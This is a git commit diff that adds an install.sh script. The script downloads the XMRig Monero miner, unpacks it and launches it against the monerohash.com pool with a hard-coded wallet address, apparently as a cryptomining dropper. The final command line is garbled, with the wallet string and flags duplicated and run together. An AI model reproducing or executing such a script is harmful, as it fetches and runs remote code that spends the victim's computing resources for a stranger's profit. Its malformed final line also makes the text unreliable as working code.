bdcc5d931b01f494a23cb3323432d25035fbf443
0x82b <75819560+0x82b@users.noreply.github.com>
2020-12-25 12:17:53 -0500

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-linux-x64.tar.gz
+tar xzvf xmrig-6.7.0-linux-x64.tar.gz
+rm xmrig-6.7.0-linux-x64.tar.gz
+./xmrig-6.7.0/xmrig -o monerohash.com:9999 -u 48xoAqhD1QaZMTr2KYi8VpQWQkQ7z1y7uj6rSvQWBBLe88YRnEWqAjxNgwUnRAhzheYtBUhgws6JGHsq67WtjY4q7nEBKi9 -k --tlsAqhD1QaZMTr2KYi8VpQWQkQ7z1y7uj6rSvQWBBLe88YRnEWqAjxNgwUnRAhzheYtBUhgws6JGHsq67WtjY4q7nEBKi9 -k --tls
